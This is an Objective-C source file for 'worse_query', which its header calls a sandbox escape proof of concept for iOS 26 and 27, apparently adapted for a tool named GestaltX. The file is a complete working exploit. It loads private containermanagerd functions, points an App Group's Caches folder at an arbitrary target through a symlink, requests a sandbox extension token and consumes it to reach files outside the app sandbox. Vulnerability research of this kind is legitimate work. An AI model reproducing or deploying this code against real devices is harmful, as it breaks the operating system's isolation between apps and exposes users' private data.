//
//  worse_query.m
//  worse_query
//
//  Created by Taj C on 8/20/26.
//

/*
     worse_query - A sandbox escape PoC for iOS 26 and 27, again.
     Copyright (C) 2026 Taj C (forcequit)

     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation, either version 3 of the License, or
     (at your option) any later version.

     This program is distributed in the hope that it will be useful,
     but WITHOUT ANY WARRANTY; without even the implied warranty of
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     GNU General Public License for more details.

     You should have received a copy of the GNU General Public License
     along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include <errno.h>
#include <string.h>
#include <stdarg.h>
#include "worse_query.h"
#import "GXCacheDirectory.h"

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

// GestaltX modification (2026-11-09): diagnostic events only; never log tokens.
static void wq_log(NSString *format, ...) NS_FORMAT_FUNCTION(1, 2);
static void wq_log(NSString *format, ...) {
    va_list arguments;
    va_start(arguments, format);
    NSString *message = [[NSString alloc] initWithFormat:format arguments:arguments];
    va_end(arguments);
    NSLog(@"[worse_query] %@", message);
    [[NSNotificationCenter defaultCenter] postNotificationName:@"GestaltX.worse_query.log"
                                                      object:nil userInfo:@{@"message": message}];
}

// So, who's ready for round two?
int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
    wq_log(@"Begin: target=%@ group=%@ alt_flags=%d create_dir=%d", target, group, alt_flags, create_dir);
    // Check if the target exists
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) {
            int code = errno;
            wq_log(@"Target check failed: errno=%d (%s), return=-255", code, strerror(code));
            return -255;
        }
        wq_log(@"Target check: OK"); // Nothing exists at this path, and create_dir is false
    }

    // Get the App Group's path
    // An App Group identifier you control is required for this
    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
    if (!groupRoot) { wq_log(@"App Group unavailable, return=-1"); return -1; }
    wq_log(@"App Group resolved"); // App Group doesn't exist or we can't access it
    NSString *caches = [[groupRoot URLByAppendingPathComponent: @"Library/Caches"] path];

    // Resolve functions
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) { wq_log(@"Load containermanager failed: %s, return=-2", dlerror()); return -2; }
    wq_log(@"Loaded libsystem_containermanager"); // dlopen failed?

    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!query_create || !query_set_class || !query_set_group_identifiers || !query_set_flags || !query_set_part || !query_get_single_result || !query_free || !copy_sandbox_token || !consume_extension) {
        wq_log(@"Required private API unavailable, return=-2");
        dlclose(mgr);
        return -2; // Failed to resolve a function (unsupported OS)
    }

    wq_log(@"Private API resolution: OK");
    // Create query
    void *query = query_create();
    if (!query) {
        wq_log(@"Query allocation failed, return=-3");
        dlclose(mgr);
        return -3; // Failed to create query
    }

    wq_log(@"Query allocated");
    // Set up query
    xpc_object_t identifier;
    query_set_class(query, 7); // We're only using class 7 here (appGroup), which goes to containermanagerd
    identifier = xpc_string_create(group.UTF8String);
    query_set_group_identifiers(query, identifier);
    query_set_part(query, 3); // The query's part sets our base path, part 3 is Library/Caches
    if (alt_flags) {
        query_set_flags(query, 0x0000000800000000ULL); // Accessing App Group containers on iOS 26.x needs different flags, for whatever reason
    } else {
        query_set_flags(query, 0x0000008000000000ULL);
    }

    wq_log(@"Query configured: class=7 part=3 flags=%@", alt_flags ? @"0x0000000800000000" : @"0x0000008000000000");
    // Preserve the original App Group cache item during this query. A shared
    // group may contain another app's data; replacing it must not erase it.
    int64_t handle = -4;
    NSError *cacheError = nil;
    BOOL restored = GXWithTemporaryCacheLink([NSURL fileURLWithPath:caches], target, ^int64_t {
        wq_log(@"Caches symlink created; submitting query");
        void *result = query_get_single_result(query);
        if (!result) {
            wq_log(@"containermanagerd rejected query, return=-5");
            return -5;
        }
        wq_log(@"Query returned a container result");
        char *token = copy_sandbox_token(result);
        if (!token) {
            wq_log(@"Sandbox token unavailable, return=-6");
            return -6;
        }
        wq_log(@"Sandbox token received (contents omitted); consuming extension");
        int64_t consumed = consume_extension(token);
        free(token);
        if (consumed >= 0) wq_log(@"Extension consumed: handle=%lld", (long long)consumed);
        else wq_log(@"Extension consume failed: handle=%lld errno=%d (%s)", (long long)consumed, errno, strerror(errno));
        return consumed;
    }, &handle, &cacheError);
    query_free(query);
    dlclose(mgr);
    if (!restored) {
        if (handle >= 0) worse_query_release(handle);
        wq_log(@"Caches setup or restoration failed: %@, return=-4", cacheError.localizedDescription);
        return -4;
    }
    wq_log(@"Cleanup: original Caches item restored");

    wq_log(@"End: return=%lld", (long long)handle);
    return handle;
}

// You should probably call this when you're done
void worse_query_release(int64_t handle) {
    if (handle < 0) { wq_log(@"Release skipped: invalid handle=%lld", (long long)handle); return; }
    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) {
        int result = release_extension(handle);
        wq_log(@"Extension release: handle=%lld result=%d", (long long)handle, result);
    } else { wq_log(@"Extension release API unavailable"); }
}
